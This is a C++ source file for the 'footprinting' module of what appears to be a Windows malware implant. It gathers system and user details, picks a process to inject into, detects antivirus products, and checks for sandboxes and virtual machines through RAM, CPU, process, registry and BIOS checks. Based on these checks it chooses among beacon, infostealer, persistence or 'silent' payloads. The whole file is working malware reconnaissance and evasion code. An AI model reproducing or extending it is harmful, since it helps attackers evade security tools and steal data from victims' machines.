#include "footprinting.h"
#include <Lm.h>
#include <versionhelpers.h>
#include <iostream>
#include <sstream>

#pragma comment(lib, "Netapi32.lib")
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Advapi32.lib")

Footprinting::Footprinting() {}

SystemInfo Footprinting::GetSystemInfo() {
    SystemInfo info;
    info.os_version = GetOSVersion();
    info.architecture = GetArchitecture();
    info.is_domain_joined = CheckDomainJoinStatus();
    
    char username[256];
    DWORD len = 256;
    if (GetUserNameA(username, &len)) {
        info.username = username;
    } else {
        info.username = "unknown";
    }

    char computerName[256];
    len = 256;
    if (GetComputerNameA(computerName, &len)) {
        info.computer_name = computerName;
    } else {
        info.computer_name = "unknown";
    }

    return info;
}

bool Footprinting::IsProcessRunning(const std::wstring& processName) {
    DWORD pid = GetProcessId(processName);
    return pid != 0;
}

DWORD Footprinting::GetProcessId(const std::wstring& processName) {
    return GetPidFromNtQuerySystemInformationW((PWCHAR)processName.c_str());
}

DWORD Footprinting::FindInjectionTarget() {
    std::vector<std::wstring> targets = {
        L"notepad.exe",
        L"chrome.exe", 
        L"msedge.exe", 
        L"firefox.exe", 
        L"explorer.exe",
        L"svchost.exe"
    };

    for (const auto& target : targets) {
        DWORD pid = GetProcessId(target);
        #ifdef DEBUG
        std::wcout << L"[Footprinting] Checking " << target << L": " << pid << std::endl;
        #endif
        if (pid != 0) {
            return pid;
        }
    }
    return 0;
}

std::string Footprinting::GetOSVersion() {
    if (IsWindows10OrGreater()) return "Windows 10+";
    if (IsWindows8Point1OrGreater()) return "Windows 8.1";
    if (IsWindows8OrGreater()) return "Windows 8";
    if (IsWindows7OrGreater()) return "Windows 7";
    return "Older Windows";
}

std::string Footprinting::GetArchitecture() {
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) return "x64";
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) return "x86";
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) return "ARM64";
    return "Unknown";
}

bool Footprinting::CheckDomainJoinStatus() {
    LPWSTR lpNameBuffer = NULL;
    NETSETUP_JOIN_STATUS BufferType = NetSetupUnknownStatus;
    NetGetJoinInformation(NULL, &lpNameBuffer, &BufferType);
    
    bool joined = (BufferType == NetSetupDomainName);
    
    if (lpNameBuffer) NetApiBufferFree(lpNameBuffer);
    
    return joined;
}

std::vector<std::string> Footprinting::GetSecurityProducts() {
    std::vector<std::string> products;
    std::vector<std::wstring> targets = {
        L"MsMpEng.exe", L"cb.exe", L"cylance.exe", L"mcshield.exe"
    };

    for (const auto& target : targets) {
        if (IsProcessRunning(target)) {
            std::string name;
            for(wchar_t c : target) name += (char)c;
            products.push_back(name);
        }
    }
    return products;
}

IntegrityLevel Footprinting::GetIntegrityLevel() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        return IntegrityLevel::UNKNOWN;
    }

    DWORD dwLengthNeeded;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwLengthNeeded);
    
    PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, dwLengthNeeded);
    if (!pTIL) {
        CloseHandle(hToken);
        return IntegrityLevel::UNKNOWN;
    }

    IntegrityLevel level = IntegrityLevel::UNKNOWN;
    if (GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLengthNeeded, &dwLengthNeeded)) {
        DWORD dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));

        if (dwIntegrityLevel < SECURITY_MANDATORY_LOW_RID) level = IntegrityLevel::UNTRUSTED;
        else if (dwIntegrityLevel < SECURITY_MANDATORY_MEDIUM_RID) level = IntegrityLevel::LOW;
        else if (dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) level = IntegrityLevel::MEDIUM;
        else if (dwIntegrityLevel < SECURITY_MANDATORY_SYSTEM_RID) level = IntegrityLevel::HIGH;
        else level = IntegrityLevel::SYSTEM;
    }

    LocalFree(pTIL);
    CloseHandle(hToken);
    return level;
}

std::string Footprinting::GetIntegrityLevelName(IntegrityLevel level) {
    switch (level) {
        case IntegrityLevel::UNTRUSTED: return "Untrusted";
        case IntegrityLevel::LOW: return "Low";
        case IntegrityLevel::MEDIUM: return "Medium";
        case IntegrityLevel::HIGH: return "High";
        case IntegrityLevel::SYSTEM: return "System";
        default: return "Unknown";
    }
}

bool Footprinting::IsSandbox() {
    // 1. Check RAM (< 4GB is suspicious)
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    if (statex.ullTotalPhys < (4ULL * 1024 * 1024 * 1024)) {
        return true;
    }

    // 2. Check CPU Cores (< 2 is suspicious)
    SYSTEM_INFO sysInfo;
    ::GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        return true;
    }

    // 3. Check for VM Processes
    std::vector<std::wstring> vmProcesses = {
        L"vmtoolsd.exe", L"vmwaretray.exe", L"vmwareuser.exe", 
        L"vboxservice.exe", L"vboxtray.exe", 
        L"xenservice.exe", L"prl_cc.exe", L"prl_tools.exe"
    };

    for (const auto& proc : vmProcesses) {
        if (IsProcessRunning(proc)) {
            return true;
        }
    }

    // 4. Check Registry Keys (VMware, VirtualBox, Hyper-V)
    std::vector<std::string> vmRegKeys = {
        "SOFTWARE\\VMware, Inc.\\VMware Tools",
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        "SYSTEM\\CurrentControlSet\\Services\\vmicguestinterface",
        "HARDWARE\\ACPI\\DSDT\\VBOX__"
    };

    for (const auto& key : vmRegKeys) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
    }

    // 5. Check BIOS Manufacturer/Model
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[256];
        DWORD bufferLen = 256;
        
        // Check SystemManufacturer
        if (RegQueryValueExA(hKey, "SystemManufacturer", NULL, NULL, (LPBYTE)buffer, &bufferLen) == ERROR_SUCCESS) {
            std::string manufacturer(buffer);
            for(auto& c : manufacturer) c = tolower(c);
            
            if (manufacturer.find("vmware") != std::string::npos || 
                manufacturer.find("virtualbox") != std::string::npos ||
                manufacturer.find("innotek") != std::string::npos ||
                manufacturer.find("xen") != std::string::npos ||
                manufacturer.find("qemu") != std::string::npos) {
                RegCloseKey(hKey);
                return true;
            }
        }

        // Check SystemProductName
        bufferLen = 256;
        if (RegQueryValueExA(hKey, "SystemProductName", NULL, NULL, (LPBYTE)buffer, &bufferLen) == ERROR_SUCCESS) {
            std::string product(buffer);
            for(auto& c : product) c = tolower(c);

            if (product.find("vmware") != std::string::npos || 
                product.find("virtualbox") != std::string::npos ||
                product.find("virtual machine") != std::string::npos) {
                RegCloseKey(hKey);
                return true;
            }
        }
        RegCloseKey(hKey);
    }

    return false;
}

std::vector<std::string> Footprinting::GetInstalledSoftware() {
    std::vector<std::string> software;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return software;
    }

    DWORD dwIndex = 0;
    char subKeyName[256];
    DWORD dwNameLen = 256;

    while (RegEnumKeyExA(hKey, dwIndex, subKeyName, &dwNameLen, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
        HKEY hSubKey;
        if (RegOpenKeyExA(hKey, subKeyName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
            char displayName[256];
            DWORD dwDataLen = 256;
            if (RegQueryValueExA(hSubKey, "DisplayName", NULL, NULL, (LPBYTE)displayName, &dwDataLen) == ERROR_SUCCESS) {
                software.push_back(std::string(displayName));
            }
            RegCloseKey(hSubKey);
        }
        dwIndex++;
        dwNameLen = 256;
    }
    RegCloseKey(hKey);
    return software;
}

PayloadType Footprinting::SuggestPayload() {
    // 1. Check Sandbox -> Silent
    if (IsSandbox()) {
        return PayloadType::SILENT;
    }

    // 2. Check Integrity -> Persistence (if Admin/High)
    IntegrityLevel level = GetIntegrityLevel();
    if (level == IntegrityLevel::HIGH || level == IntegrityLevel::SYSTEM) {
        return PayloadType::PERSISTENCE;
    }

    // 3. Check for Security Products -> Silent
    std::vector<std::string> secProducts = GetSecurityProducts();
    if (!secProducts.empty()) {
        return PayloadType::SILENT;
    }

    // 4. Check for Browsers -> Infostealer
    std::vector<std::wstring> browsers = {L"chrome.exe", L"firefox.exe", L"msedge.exe", L"brave.exe"};
    for (const auto& browser : browsers) {
        if (IsProcessRunning(browser)) {
            return PayloadType::INFOSTEALER;
        }
    }

    // Default
    return PayloadType::BEACON;
}

std::string Footprinting::GetPayloadName(PayloadType type) {
    switch (type) {
        case PayloadType::BEACON: return "Beacon";
        case PayloadType::INFOSTEALER: return "Infostealer";
        case PayloadType::PERSISTENCE: return "Persistence";
        case PayloadType::SILENT: return "Silent";
        default: return "Unknown";
    }
}
